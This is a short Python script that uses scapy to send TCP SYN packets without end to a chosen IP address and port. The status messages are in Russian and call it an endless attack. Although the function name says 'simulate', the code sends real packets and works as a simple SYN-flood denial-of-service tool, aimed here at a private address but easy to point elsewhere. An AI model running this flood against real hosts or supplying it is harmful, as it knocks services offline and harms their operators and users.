from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from time import sleep

def simulate_ddos_attack_forever(target_ip: str, target_port: int = 80, interval_sec: float = 0.01):
    print(f"⚡ Бесконечная атака на {target_ip}:{target_port} (нажми Ctrl+C для остановки)")
    packet_count = 0
    try:
        while True:
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            packet_count += 1
            print(f"[{packet_count}] Отправлен SYN пакет")
            sleep(interval_sec)
    except KeyboardInterrupt:
        print("\n🛑 Атака остановлена пользователем.")

if __name__ == "__main__":
    simulate_ddos_attack_forever(target_ip="10.0.0.5", target_port=80)
